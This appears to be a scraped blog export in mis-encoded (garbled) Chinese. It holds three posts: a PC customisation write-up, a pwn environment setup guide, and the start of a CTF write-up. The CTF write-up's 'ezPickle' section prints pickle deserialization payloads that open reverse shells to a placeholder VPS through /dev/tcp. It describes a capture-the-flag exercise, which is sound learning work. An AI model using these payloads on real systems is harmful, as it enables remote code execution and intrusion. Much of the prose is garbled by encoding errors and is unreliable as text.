æ„æ€æ€ä¹ˆæ··æ­å‡ºæœ€å¥½çœ‹çš„ä¸ªæ€§ä¸»é¢˜ï¼Œä½†æ˜¯ä¹Ÿå°±æ­¢æ­¥äºæ­¤ é«˜ä¸­ä¹‹åè¯¾ä½™æ—¶é—´å˜å°‘ï¼Œä¹Ÿæ…¢æ…¢æ²¡æœ‰ç©ºå¯¹è‡ªå·±çš„æ‰‹æœºå¥½å¥½çš„ç¾åŒ– ç”µè„‘æ›´æ˜¯ä¸æ€ä¹ˆç”¨äº†ï¼›å…¶é—´å€’æ˜¯å€’è…¾è¿‡ä¸€æ®µæ—¶é—´çš„é’¢ç¬”å½©å¢¨ ç°åœ¨è¿˜æœ‰ä¸å°‘å›¤è´§ï¼Œå›æ°´å‘€ é²¶é±¼å‘€ ç™¾ä¹å‘€ è¿˜æœ‰å¾ˆå¤šå…¶ä»–ç‰Œå­çš„å¢¨ç°åœ¨è¿˜éƒ½åœ¨ä¹¦æ¡Œçš„å°å­ä¸Šï¼Œå„ç§ èŠ±é‡Œèƒ¡å“¨åˆæ¯«æ— åµç”¨ååˆ†å¥½çœ‹çš„ç¬”ç°åœ¨ä¹Ÿè¢«ç›¸å½“è§„æ•´çš„æ”¶åœ¨äº†ç”¨ä½œå±•ç¤ºçš„äºšå…‹åŠ›æ¶å­ä¸Šï¼ˆæ˜¯ä¸€ç§å¯ä»¥æ–œç€æ”¾ç¬”çš„æ¶å­ å›¾ç‰‡å¦‚ä¸‹ æˆ‘æœ‰6ä¸ªè¿™æ ·çš„æ”¶çº³ç¬”ç­’ å‹‰å¼ºå¤Ÿæ”¾æˆ‘çš„ç¬”ä»¬ï¼‰åŒ…æ‹¬å¾ˆå¤šå¾ˆè´µçš„é™å®šç¬”TAT ç°åœ¨å›å¤´å†çœ‹å¥½å¿ƒç–¼é’± å¤ªè´¥å®¶äº†\nå…œå…œè½¬è½¬ï¼Œç›´åˆ°å¤§ä¸€çš„å¯’å‡æ‰å†æŠŠæ‰‹æœºå’Œç”µè„‘æ–¹é¢çš„ç¾åŒ–ç»™æ‹¾èµ·æ¥ï¼Œç„¶è€Œæ´»åŠ›å’ŒåŠ²å¤´ä¸å‡å½“å¹´\nå‰å‡ å¤©æ­åšå®¢çš„æ—¶å€™å°±æƒ³ é™¤äº†wpå’Œä¸€äº›å­¦ä¹ ç¬”è®°ä¹‹å¤–ï¼Œè¿˜æœ‰ä»€ä¹ˆæ˜¯æ—¢å€¼å¾—è‡ªå·±è®°å½• åˆå€¼å¾—åˆ†äº«å‡ºæ¥çš„å‘¢ï¼Ÿ ï¼ˆè™½ç„¶å¹¶æ²¡æœ‰äººä¼šçœ‹å°±æ˜¯äº†ï¼‰ è„‘å­é‡Œç¬¬ä¸€ä¸ªè¹¦å‡ºæ¥çš„å°±æ˜¯\u0026quot;beautify\u0026quot;â€”â€”è¿™æ˜¯æœ€æœ€é€‚åˆä¸è¿‡çš„äº†ï¼ï¼ï¼\næ‰€ä»¥å…ˆç®€å•æ¦‚è¿°ä¸€ä¸‹ç°çŠ¶ ç›®å‰çš„æ‰‹æœºæ˜¯å°ç±³10ï¼Œå¤‡ç”¨æœºæ˜¯å°ç±³5spï¼ˆæ²¡é”™ å°±æ˜¯é‚£ä¸ªéªé¾™825å‘çƒ­ç‹‚é­”â€¦â€¦æ— æ¯”åæ‚”å½“æ—¶å› ä¸ºå°ç±³6æ²¡æœ‰3.5mmè€³æœºå­”è€Œæ¯…ç„¶å†³ç„¶åœ°é€‰æ‹©äº†å®ƒï¼‰ç”µè„‘æ˜¯å°æ–°pro16ç‹¬æ˜¾ç‰ˆï¼Œç»¼åˆæ€§èƒ½éƒ½è¿˜å¯ä»¥\næ‰‹æœºå’Œç”µè„‘ä½œä¸ºå¹³æ—¶çš„ä¸»è¦ç”Ÿäº§åŠ›å·¥å…·ï¼Œç¾åŒ–çš„æ–¹å‘å’Œæ³¨æ„ç‚¹ä¸»è¦æœ‰è¿™ä¹ˆå‡ ä¸ªï¼š\nè‰²å½©æ­é…è¦åˆç†ï¼Œç©ºé—´ç»“æ„è¦æœ‰åº æœ‰è½»å·§çš„å¿«æ·å°å·¥å…·æ¥æé«˜æ•ˆç‡ è‡ªå·±ç”¨ç€å¾—ç§°å¿ƒé¡ºæ‰‹ï¼Œä¸éšæ³¢é€æµå»é€‰æ‹©è¿‡äºç¹æ‚çš„ç¾åŒ–æ–¹å¼ å…¼å…·é¢œå€¼å’Œå®ç”¨æ€§ï¼Œå·¥å…·æœ€ç»ˆæœåŠ¡äºäººï¼Œä¸è¿½æ±‚é¢œå€¼è€Œç‰ºç‰²æ€§èƒ½ æ‰€ä»¥åŸºäºä»¥ä¸Šçš„ â€œåœ£ç»â€â€œç¾åŒ–æ€è·¯â€ï¼Œæœ¬ç¯‡å…ˆä»æˆ‘çš„pcç®€å•è¯´èµ·å§(ã‚âˆ€ï½¥)â˜†\nâ€”â€”â€”â€”é¢„è­¦ï¼šå¯èƒ½ä¼šå¾ˆé•¿å¾ˆé•¿ï¼Œå¤§æ¦‚ç‡ä¹‹åä¼šä¿®ä¿®è¡¥è¡¥å½¢æˆä¸€ä¸ªè¿~ç»­~å‰§~\næ·±è‰²æ¨¡å¼ï¼Ÿäº®è‰²æ¨¡å¼ï¼ ï¼ˆå…ˆç»™è‡ªå·±å å±‚ç”²ï¼‰æ‰‹æœºä¸Šæˆ‘è®¾ç½®æ™šä¸Š11ç‚¹ä»¥åè‡ªåŠ¨æ·±è‰²æ¨¡å¼å¹¶ä¸”éå¸¸å–œæ¬¢è¿™ä¸ªåŠŸèƒ½ï¼Œè®©æˆ‘æ™šä¸Šçœ‹æ‰‹æœºä¸å†çœ¼ç\nä½†æ˜¯ï¼ï¼ï¼ä½†æ˜¯ï¼ï¼ï¼ä½¿ç”¨pcçš„åœºæ™¯éƒ½æ˜¯ç¯å¢ƒç¯å…‰æ­£å¸¸çš„æƒ…å†µï¼Œåœ¨è¿™æ ·çš„æƒ…å†µä¸‹æ·±è‰²åº•é…ä¸Šç™½è‰²/èŠ±é‡Œèƒ¡å“¨è‰²çš„ä»£ç çœŸçš„ä¸ä¼šè®©äººçœ¼æ™•å—ï¼ï¼ï¼æˆ‘æ˜¯å®Œå…¨æ¥å—ä¸æ¥ï¼Œå“’å’©ï¼ï¼ï¼\næ‰€ä»¥æˆ‘çš„å„ç§terminal\u0026amp;ide\u0026amp;å…¶å®ƒç§ç§çš„é…è‰²ï¼Œå…¨ éƒ¨ éƒ½ æ˜¯ äº®è‰²æ¨¡å¼\nkali è¿™ä¸ªé¢œå€¼ä¸ç”¨å¤šè¯´å§ï¼ˆ\nubuntu vscode ä¸»é¢˜ï¼šGithub Light Theme\nidea ä¸€äº›åŸºç¡€è§‚å¿µ é…è‰²å¿…é¡»ç»Ÿä¸€ ä¸€å¼ å›¾å°±æ˜ç™½äº†\nedgeæˆ‘å–œæ¬¢å‚ç›´æ ‡ç­¾é¡µï¼Œä¼šè®©æ˜¾ç¤ºç©ºé—´å˜å¤§ï¼Œå¼€å››äº”åä¸ªæ ‡ç­¾é¡µçš„æ—¶å€™ä¾§æ ä¹Ÿä¸ä¼šæ‹¥æŒ¤ï¼Œä¸»é¢˜æ˜¯å†°å‡‰çš„è–„è·ï¼›Chromiumçš„ä¸»é¢˜æ˜¯Sea Foam\nedgeæ›¾ç»æˆ‘è§‰å¾—ä¸€ä¸ªç—›ç‚¹æ˜¯ä¸èƒ½ç»™æ ‡ç­¾é¡µåˆ†ç»„ï¼Œç›´åˆ°æœ€è¿‘çš„æ›´æ–°ä¸Šäº†è¿™ä¸ªåŠŸèƒ½ï¼Œé‚£è¿™å°±æ²¡å•¥è¯´çš„äº†ï¼Œåœ¨æˆ‘å¿ƒä¸­å·²ç»è¶…è¶Šäº†Chromeï¼Œedgeå¤©ä¸‹ç¬¬ä¸€ï¼\næ¡Œé¢å¿…é¡»ç®€æ´ èƒŒæ™¯å›¾id=89931517ï¼Œéšè—äº†æ¡Œé¢å›¾æ ‡å’Œåº•è¾¹ä»»åŠ¡æ ï¼ˆalt+tab æˆ–è€…ä¸‰æŒ‡çš„è§¦æ‘¸æ‰‹åŠ¿è¦æ¯”ç‚¹å‡»åˆ‡æ¢åº”ç”¨é¡µé¢æ›´æ–¹ä¾¿ï¼ˆå†µä¸”å¹³æ—¶åªæ˜¾ç¤ºæ¡Œé¢çš„æƒ…æ™¯å¾ˆå°‘ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹éƒ½æ˜¯å¼€ä¸€å †å †çš„é¡µé¢\nwin10çš„ç£è´´æˆ‘çœŸçš„å¤ªçˆ±äº†\né™¤äº†å¶å°”ä¼šå‡ºBug é‡å¯ä¸ªç³»ç»Ÿç»“æœæˆ‘æ’å¥½çš„é¡ºåºå…¨æ•´æ²¡äº†ğŸ˜…å´©è¿‡å¥½å‡ æ¬¡äº†å·²ç»\næœ‰äº›å·¥å…·åœ¨æ–‡ä»¶å¤¹ä¸­ï¼Œå°±æ²¡æœ‰å…¨è´´ä¸Šæ¥äº†ï¼Œå®Œæ•´çš„å½¢æ€åº”è¯¥æ˜¯ä¸€ä¸ªå¿ƒå‹~\næŒ‡é’ˆå¿…é¡»èŠ±å“¨ æœ‰è°èƒ½æ‹’ç»å°è±†æ³¥å‘¢ï¼\nshell\u0026amp;terminal zshell zhellå¤šå¥½ç”¨ä¸ç”¨æˆ‘å¤šè¯´å§ï¼Ÿkalié»˜è®¤çš„å°±æ˜¯zshellï¼Œé«˜äº®ã€ä»£ç è¡¥å…¨ç­‰åŠŸèƒ½æ˜¯çœŸçš„å¤ªè´´å¿ƒäº†ï¼Œbashè·Ÿå®ƒä¸€æ¯”çœŸæ˜¯ç›¸å½¢è§ç»Œï¼Œæ‰€ä»¥æˆ‘çš„linuxè™šæ‹Ÿæœºä»¥åŠvpséƒ½ä¸Šäº†zhell\u0026amp;oh-my-zshï¼›è¯•äº†ä¸€äº›ä¸»é¢˜ï¼Œä½†è¿˜æ˜¯é»˜è®¤çš„robbyrussellæ·±å¾—æˆ‘å¿ƒâ€¦â€¦\nåªæœ‰çš®è‚¤ä¹Ÿä¸è¡Œï¼Œè¿˜å¾—é…ä¸Šç»™åŠ›çš„æ’ä»¶â€”â€”zsh-syntax-highlightingï¼ˆè¯­æ³•é«˜äº®ï¼‰å’Œzsh-autosuggestionsï¼ˆæ ¹æ®å†å²è®°å½•è‡ªåŠ¨è¡¥å…¨ï¼‰\nwindows terminal winè‡ªå¸¦çš„cmdå’Œpowershellï¼Œåªèƒ½è¯´æ‡‚å¾—éƒ½æ‡‚â€”â€”ä¸€ä¸ªæ˜¯å¤§é»‘æ¡†ä¸€ä¸ªæ˜¯å¤§è“æ¡†ï¼Œå‰è€…ç®€é™‹è‡³æï¼Œåè€…çš„æŠ¥é”™é¡µé¢ï¼ˆè“åº•çº¢å­—ï¼‰çœ‹ç€èƒ½è®©äººå¿ƒè·³éª¤åœï¼Œå³ä½¿æˆ‘å·²ç»å°½åŠ›è®¾ç½®èƒŒæ™¯é€æ˜ã€æ˜¾ç¤ºçš„é¢œè‰²ï¼Œå‡ºæ¥çš„æ•ˆæœä¹Ÿä¸å°½äººæ„\nè¿™æ—¶Terminalè¿™ä¸ªç¥å¥‡çš„ä¸œè¥¿å°±æ¥æ•‘åœºäº†â€”â€”é…åˆpwsh7\u0026amp;oh-my-poshå‡ ä¹å¯ä»¥è¾¾åˆ°ç±»zshçš„ä½“éªŒ\næ­¤å¤„çš„shellä¸»é¢˜æ˜¯ysï¼ˆå¯¹æ²¡çœ‹é”™ å°±æ˜¯zshä¸‹å¾ˆç«çš„é‚£ä¸ªï¼‰ï¼ŒèƒŒæ™¯å›¾id=89393158ï¼Œé…è‰²æ–¹æ¡ˆæ˜¯ayu_lightï¼Œå­—ä½“æ˜¯12å·Cascadia Code PLï¼›åŠ è½½äº†posh-gitå’Œoh-my-poshæ¨¡å—ï¼Œå¹¶è®¾ç½®äº†PSReadLine\nè¿™æ ·ä¸€æ¥æˆ‘ä»¬çš„pwshä¹Ÿæœ‰äº†æ ¹æ®å†å²è®°å½•è‡ªåŠ¨è¡¥å…¨ã€tabé€‰æ‹©ç›®å½•è¿™æ ·çš„åŠŸèƒ½ï¼ˆæ›´å¤šçš„åŠŸèƒ½å¯ä»¥å‚ç…§å®˜æ–¹æ–‡æ¡£è‡ªè¡Œè®¾ç½®ï¼‰\nåŒæ—¶**win+`**è¿™ä¸ªå¿«æ·é”®å¯ä»¥å‘¼å‡ºä¸´æ—¶åœé çª—å£â€œç„¦ç‚¹ç»ˆç«¯â€\nå¯¹ä¸´æ—¶æƒ³è¦æ‰§è¡Œä¸ªè„šæœ¬ã€è¿ä»¥ä¸‹vpsã€æŸ¥ä¸ªä¸œè¥¿ä»€ä¹ˆçš„ç®€ç›´ä¸èƒ½æ›´æ–¹ä¾¿ï¼\nåŒæ—¶å®ƒè¿˜æ”¯æŒé€šè¿‡jsonæ¥æ·»åŠ é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥å°†è‡ªå·±çš„vpsç›´æ¥åŠ è¿›æ¥\nå†è®¾ç½®ssh-keyå°±å¯ä»¥ä¸€é”®å…å¯†ç™»å½•å•¦äº†ï¼\nå”¯ä¸€çš„ç¼ºæ†¾ï¼Œå°±æ˜¯ä¸åƒfinal shellä¸€æ ·æœ‰å¾ˆå¥½çš„æ–‡ä»¶ä¸Šä¼ ä¸‹è½½ä»¥åŠftpçš„åŠŸèƒ½ï¼Œä¸ç„¶å¯ä»¥ç›´æ¥é©äº†å…¶å®ƒsshç»ˆç«¯çš„å‘½ï¼ˆè¯´çš„å°±æ˜¯ä½  finalshellï¼‰\nå¿…ä¸å¯å°‘çš„å°å·¥å…· everything æ›¾ç»å¹´å°‘è½»ç‹‚çš„æˆ‘å›ºæ‰§çš„è®¤ä¸ºè¿™ç§ä¸œè¥¿æ˜¯ç»™å‘½åæ–‡ä»¶ä¸è§„èŒƒçš„äººå‡†å¤‡çš„\nåæ¥æˆ‘å‘ç°æˆ‘é”™äº†â€¦â€¦everythingçœŸé¦™ï¼ï¼ï¼ï¼\nå®ƒèƒ½éå¸¸éå¸¸è¿…é€Ÿçš„æ‰¾åˆ°æˆ‘æƒ³è¦çš„æ–‡ä»¶ï¼Œè¿˜èƒ½è¿›è¡Œé¢„è§ˆï¼Œå¤ªå¥½ç”¨äº†ç®€ç›´æ˜¯\nSnipaste æœ€å¼ºæˆªå›¾å·¥å…·äº†ï¼Œæˆªå›¾åå¯ä»¥è´´åœ¨å±å¹•ä¸Šï¼Œè°ƒæ•´å¤§å°ã€é€æ˜åº¦ã€ç®€å•çš„æ¶‚é¸¦æ ‡æ³¨éƒ½ä¸åœ¨è¯ä¸‹ï¼Œå ç”¨å†…å­˜ä¹Ÿæ¯”è¾ƒå°ï¼Œè£…æœºå¿…å¤‡~\nCClose åˆä¸€ä¸ªè£…æœºå¿…å¤‡äº†\nå°±è¯´è¿™äº›åŠŸèƒ½è¿˜æœ‰è°ä¸å¿ƒåŠ¨ï¼ï¼ï¼ï¼ï¼ï¼å†…å­˜å ç”¨ä¹Ÿå¾ˆå°ï¼Œå¯ä»¥è¯´æå¤§çš„æå‡äº†æˆ‘å¹³å¸¸çš„å­¦ä¹ æ•ˆç‡\nï¼ˆå»ºè®®è‡ªå¯åŠ¨+ä»¥ç®¡ç†å‘˜æ¨¡å¼å¼€å¯ï¼ˆé˜²æ­¢æŸäº›è¿‡äº†UACçš„åº”ç”¨å®ƒæ²¡æœ‰æƒé™\nDigital Clock å°±æ˜¯è¿™ä¸ªä¼šä¸€ç›´å‡ºç°åœ¨æˆ‘å„ç§æˆªå›¾ä¸­çš„å°éƒ¨ä»¶\nå¤Ÿç®€å•ï¼Œè¿™ä¸ªå¤§å°æ”¾åœ¨å±å¹•ä¸Šä¹Ÿååˆ†åˆé€‚ï¼Œè¿˜å¯ä»¥è®¾ç½®é€æ˜åº¦ ä¸ä¼šæŒ¡åˆ°æ–‡å­—\nä½†æ˜¯ä¸çŸ¥é“ä»ä»€ä¹ˆæ—¶å€™å¼€å§‹åœ¨å…³æœºçš„æ—¶å€™ä¼šæŠ¥ä¸ªé”™ï¼Œç„¶åä¸ä¼šä¿å­˜æˆ‘å·²è®¾ç½®å¥½çš„é¢œè‰²æ–¹æ¡ˆï¼Œå¯¼è‡´å†æ¬¡å¼€æœºåéœ€è¦é‡æ–°è®¾ç½®\nå¦å¤–è¿™ç©æ„çš„å†…å­˜å ç”¨ç«Ÿç„¶æœ‰16Mâ€¦â€¦æ„Ÿè§‰è·ŸåŠŸèƒ½å¹¶ä¸æ˜¯ååˆ†åŒ¹é…å•Š å°±åªä¸è¿‡åœ¨å±å¹•ä¸Šå±‚æ˜¾ç¤ºè€Œå·²ï¼ˆä½†æ˜¯å¾ˆå¯æƒœæ²¡æœ‰æ‰¾åˆ°é€‚åˆçš„æ›¿ä»£å“TAT\n*TileBeautify ç£è´´ç¾åŒ–å·¥å…·ï¼Œå¯ä»¥å°†ç£è´´æ¢æˆä»»æ„çš„å›¾ç‰‡ï¼Œè¿›è¡Œç»„åˆä¹‹åä¼šå¾ˆå¥½çœ‹\nï¼ˆä½†æ˜¯å§ æˆ‘æ¢ç”µè„‘ä¹‹åå°±æ²¡æŠ˜è…¾è¿™ä¸ªäº† å› ä¸ºä¸æ–¹ä¾¿\nè¯´å®è¯è¿™ç¯‡æ–‡æ¡£çš„åˆ›å»ºæ—¶é—´æ˜¯\nåˆ«éª‚äº†ï¼Œéƒ½æ˜¯æˆ‘å¤ªæ‡’ç‹—\nä¹‹åä¸€å®šä¼šè®¤çœŸèµ·æ¥çš„ï¼Œä¸ç®¡æ˜¯å­¦ä¹ ä¸Šï¼Œç”Ÿæ´»ä¸Šï¼Œè¿˜æ˜¯ä¸ªäººçš„å‘å±•ä¸Š\næ¯å¤©åšé¢˜ä»€ä¹ˆçš„ï¼Œå‘ç°è‡ªå·±æ˜¯çœŸçš„èœï¼Œæ˜¯çœŸçš„é“æ²¸ç‰©ï¼Œè·Ÿå¤§å®¶æ¯”èµ·æ¥æˆ‘çœŸçš„æ°´å¹³å¤ªä½äº†ï¼Œæ˜¯ä¸å€¼ä¸€æçš„é‚£ç§\nå®³ï¼Œä¸å¤šè¯´äº†\nè·Ÿåˆ«äººå­¦ï¼Œå’Œè‡ªå·±æ¯”\n","date":"2021-10-28T13:42:14+08:00","permalink":"https://amiaaaz.github.io/2021/10/28/beautify-my-pc/","section":"posts","tags":[],"title":"ç”Ÿäº§åŠ›æ(mei)é«˜(hua)ä¹‹è·¯"},{"categories":["ç¯å¢ƒé…ç½®","pwn"],"contents":"ä»¥ä¸‹ä¸ºUbutun16.04\u0026amp;py2çš„å®‰è£…è¿‡ç¨‹ï¼Œå…¶ä»–ç‰ˆæœ¬å‘½ä»¤å‡ ä¹ç›¸åŒçš„~ï¼ˆUbuntu20\u0026amp;py3çš„æˆ‘ä¹Ÿè£…äº†ä¸€ä¸ªï¼Œæ¯•ç«Ÿpy3æ˜¯ä¸»æµï¼ŒæŠ€æœ¯æ€»æ˜¯å‘å‰å‘å±•çš„å˜›~ï¼‰\nâ€”â€”â€”â€”æ¯•ç«Ÿæˆ‘æ˜¯ä»¥åˆå­¦è€…çš„è§†è§’æ¥å‡†å¤‡pwnçš„ç¯å¢ƒï¼Œè‚¯å®šè¿˜æœ‰å¾ˆå¤šä¸å…¨é¢\u0026amp;æƒ³ä¸åˆ°çš„åœ°æ–¹ï¼Œä¹‹åç”¨åˆ°äº†ä¼šå›æ¥è¡¥ä¸Šçš„~\nå®‰è£…pip2\u0026amp;pip3\u0026amp;ipython\ncurl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py sudo python get-pip.py # sudo apt-get install python3-pip curl https://bootstrap.pypa.io/pip/3.5/get-pip.py -o get-pip.py sudo python3 get-pip.py sudo apt-get install ipython å®‰è£…py2çš„pwntools\npip2 install pathlib2 # py3æ— éœ€æ­¤æ¡ pip2 install pwntools å®‰è£…GDB\u0026amp;æ’ä»¶\nsudo apt-get install git git clone https://github.com/pwndbg/pwndbg.git ./setup.sh # ä½¿ç”¨peda-heap git clone https://github.com/Mipu94/peda-heap.git echo \u0026#34;source ~/GDB-Plugins/peda-heap/peda.py\u0026#34; \u0026gt; ~/.gdbinit # ä½¿ç”¨peda git clone https://github.com/longld/peda.git echo \u0026#34;source ~/GDB-Plugins/peda/peda.py\u0026#34; \u0026gt; ~/.gdbinit # ä½¿ç”¨gef git clone https://github.com/hugsy/gef.git echo \u0026#34;source ~/GDB-Plugins/gef/gef.py\u0026#34; \u0026gt; ~/.gdbinit # ä½¿ç”¨pwndbg echo \u0026#34;source ~/GDB-Plugins/pwndbg/gdbinit.py\u0026#34; \u0026gt; ~/.gdbinit # è‡ªåŠ¨åˆ‡æ¢è„šæœ¬ https://blog.csdn.net/aptx4869_li/article/details/81566541 å®‰è£…one_gadget\nsudo apt-add-repository ppa:brightbox/ruby-ng sudo apt-get update sudo apt-get install ruby2.7 ruby2.7-dev sudo apt-get install gem sudo gem install one_gadget å®‰è£…32ä½åº“\nsudo apt-get install lib32ncurses5 sudo apt install libc6-dev-i386 sudo apt-get install lib32z1 å®‰è£…checksec\nsudo apt instal checksec å®‰è£…seccomp-tools\nsudo gem install seccomp-tools å®‰è£…zshell\u0026amp;æ’ä»¶\nsudo apt-get install zsh sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; # zsh-syntax-highlighting git clone https://github.com/zsh-users/zsh-syntax-highlighting.git echo \u0026#34;source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh\u0026#34; \u0026gt;\u0026gt; ${ZDOTDIR:-$HOME}/.zshrc source ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh # zsh-autosuggestions git clone https://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh # å¦‚é‡æŠ¥é”™ error: RPC failed; result=35, HTTP code=0; fatal: The remote end hung up unexpectedly # å°†git clone https://xxxx/xxxx.git æ¢ä¸ºgit clone git://xxxx/xxxx.git å®‰è£…virtualboxå¢å¼ºåŠŸèƒ½\n# é‡æŠ¥é”™ unable to access â€œVBox_GAS_6.0.0 iso9660â€ sudo apt-get install --reinstall linux-image-$(uname -r) æœ€åç»“æœ\nubuntu20+py3+zshï¼ˆåº”è¯¥èƒ½çœ‹å‡ºæ¥æˆ‘æ›´å–œæ¬¢è¿™ä¸ªx\nubuntu16+py2\nç¬¬ä¸€æ¬¡è£…çš„æ—¶å€™ç›´æ¥å¡åœ¨äº†pwntoolsä¸Šï¼Œåæ¥å‘ç°åŸå› æ˜¯pip2ç‰ˆæœ¬è¿‡ä½ä¸”æ— æ³•ç›´æ¥é€šè¿‡pip -m pip install --upgrade pipè¿›è¡Œå‡çº§ï¼Œåªèƒ½æ‰‹åŠ¨ä¸‹è½½get-pip.pyåé€šè¿‡py2è¿è¡Œæ¥å®‰è£…\nè¿™æ¬¡é…å®Œä¹‹åæœ€å¤§çš„æ„Ÿè§¦å°±æ˜¯è¯¥æ¢ä¸ªå¤§ä¸€ç‚¹çš„ç¡¬ç›˜äº†ï¼Œ512Gå±å®ç»·ä¸ä½æˆ‘æè¿™ä¹ˆå¤šè™šæ‹Ÿæœºâ€¦â€¦\nä¹‹åå¯èƒ½ä¼šæŠ½ç©ºå­¦ä¸€ä¸‹pwnï¼Œå±äºæ˜¯webç‹—å·ä¸åŠ¨äº†è¦ç»™è‡ªå·±æ‰¾ä¸ªåè·¯ï¼ˆè™½ç„¶ç™¾åˆ†ä¹‹ä¹åä¹çš„æ¦‚ç‡æ˜¯ä¸¤ä¸ªéƒ½å¾ˆèœï¼Œxsï¼‰ï¼Œå·èµ·æ¥å·èµ·æ¥ï¼ï¼ï¼\n","date":"2021-10-28T00:41:15+08:00","permalink":"https://amiaaaz.github.io/2021/10/28/pwn-env-init/","section":"posts","tags":["pwn"],"title":"pwnç¯å¢ƒé…ç½®"},{"categories":["CTF"],"contents":" webæœ‰3ä¸ªéƒ½æ˜¯æœ‰äº†åŒ…æµ†çš„åŸé¢˜â€¦â€¦è¿˜æœ‰ä¸€ç‚¹è„‘æ´é¢˜ï¼Œåæ­£å¥‡å¥‡æ€ªæ€ªçš„\nå±äºæ˜¯è¢«å¸ˆå‚…ä»¬å¸¦é£äº†ï¼Œæ‰€ä»¥è¯¦ç»†çš„wpè¿˜æ˜¯è‡ªå·±å†™ä¸€å†™ï¼Œè®¤çœŸåœ°å¤ç°ä¸€ä¸‹\nzerocalc emmmmmm è¯´å®è¯ä¸€å¼€å§‹æ²¡æœ‰å‡º å› ä¸ºæ²¡æ‚Ÿå‡ºæ¥å®ƒè¿™æ˜¯ä¸ªä»€ä¹ˆé€»è¾‘2333333\nezPickle # ç”¨pker.pyç”Ÿæˆpayload notadmin=GLOBAL(\u0026#39;config\u0026#39;,\u0026#39;notadmin\u0026#39;) notadmin[\u0026#34;admin\u0026#34;]=\u0026#34;yes\u0026#34; exec=GLOBAL(\u0026#39;config\u0026#39;,\u0026#39;backdoor\u0026#39;) payload=\u0026#39;\u0026#39;\u0026#39;__import__(\u0026#39;subprocess\u0026#39;).call(\\\u0026#34;echo -e \u0026#39;#!/bin/bash\\\\nsh -i \u0026gt;\u0026amp; /dev/tcp/you_vps_ip/port 0\u0026gt;\u0026amp;1\u0026#39;\u0026gt;x \u0026amp;\u0026amp; bash x \u0026amp;\u0026amp; rm -rf x\\\u0026#34;,shell=True)\u0026#39;\u0026#39;\u0026#39; exec(payload) return \u0026gt;\u0026gt;\u0026gt; data=b\u0026#39;cconfig\\nnotadmin\\np0\\n0g0\\nS\\\u0026#39;admin\\\u0026#39;\\nS\\\u0026#39;yes\\\u0026#39;\\nscconfig\\nbackdoor\\np2\\n0S\\\u0026#39;__import__(\\\\\\\u0026#39;subprocess\\\\\\\u0026#39;).call(\u0026#34;echo -e \\\\\\\u0026#39;#!/bin/bash\\\\\\\\nsh -i \u0026gt;\u0026amp; /dev/tcp/you_vps_ip/port 0\u0026gt;\u0026amp;1\\\\\\\u0026#39;\u0026gt;x \u0026amp;\u0026amp; bash x \u0026amp;\u0026amp; rm -rf x\u0026#34;,shell=True)\\\u0026#39;\\np3\\n0g2\\n(g3\\ntR.\u0026#39; \u0026gt;\u0026gt;\u0026gt; print(base64.b64encode(data)) b\u0026#39;xxxxxxxxxx\u0026#39; æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼ŒåŸºç¡€çš„pickleé¢˜ï¼Œæ˜¯2021å·…å³°æå®¢what_pickleçš„é˜‰å‰²ç‰ˆï¼ˆæ„é€ çš„æ€è·¯å‡ ä¹ä¸€æ · ä½†æ˜¯ç®€å•å¾ˆå¤šï¼‰ï¼Œå‡ ä¹ä¸€æ ·çš„é¢˜ç›®è¿˜æœ‰ [SUCTF 2019]Guess Game\né™åˆ¶çš„ç‚¹åœ¨äºåªå…è®¸å¼•å…¥é¢˜ç›®è‡ªè®¾æ¨¡å—\u0026amp;é™åˆ¶æ¨¡å—ä¸­å«ä¸‹åˆ’çº¿ï¼Œé‚£å°±ç›´æ¥å˜é‡è¦†ç›–ï¼Œç„¶ååˆ©ç”¨ç»™å‡ºçš„eval()å¼¹shellå°±å¥½äº†\nâ€”â€”â€”â€”å¦å¤–è¿™é‡Œçš„payloadä¹Ÿå¯ä»¥æ˜¯ç®€çŸ­ç‰ˆæœ¬çš„å¼¹sehllçš„payload ä¸å”¯ä¸€å˜›\ndata = b\u0026#39;cconfig\\nnotadmin\\np0\\n0g0\\nS\\\u0026#39;admin\\\u0026#39;\\nS\\\u0026#39;yes\\\u0026#39;\\nscconfig\\nbackdoor\\np2\\n0S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;bash -c \\\\\\\u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/you_vps_ip/port \u0026lt;\u0026amp;1\\\\\\\u0026#39;\u0026#34;)\\\u0026#39;\\np3\\n0g2\\n(g3\\ntR.\u0026#39; ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ç”±äºè¿™é‡Œçš„ååºåˆ—åŒ–å…¥å£æ˜¯getä¼ å‚ï¼Œæ‰€ä»¥é‡åˆ°+å·ä¼šå‡ºé—®é¢˜ï¼Œä¼ è¿›å»ä¹‹å‰è¦å…ˆurlencode(encode all special chars)\nâ€”â€”â€”â€”é¡ºå¸¦ç»ƒä¸ªæ‰‹ï¼Œæ“ä¸€ä¸ªä¸å«b'R'çš„opcodeï¼ˆç”¨b'o'ä»£æ›¿ï¼‰\ndata = b\u0026#39;\u0026#39;\u0026#39;cconfig\\nnotadmin\\np0\\n0g0\\nS\\\u0026#39;admin\\\u0026#39;\\nS\\\u0026#39;yes\\\u0026#39;\\nscconfig\\nbackdoor\\np2\\n0S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;bash -c \\\\\\\u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/you_vps_ip/port \u0026lt;\u0026amp;1\\\\\\\u0026#39;\u0026#34;)\\\u0026#39;\\np3\\n0(g2\\ng3\\no.\u0026#39;\u0026#39;\u0026#39; ä¼ å‚çš„æ—¶å€™è®°å¾—å†urlencodeä¸€ä¸‹~~~\nâ€”â€”â€”â€”ä¹‹å‰æˆ‘çš„æ€»ç»“ç¬”è®°å·²ç»ç›¸å½“å…¨é¢äº† å¯ä»¥å‡ºCTFæ•™ç§‘ä¹¦äº†233333\nJack-Shiro 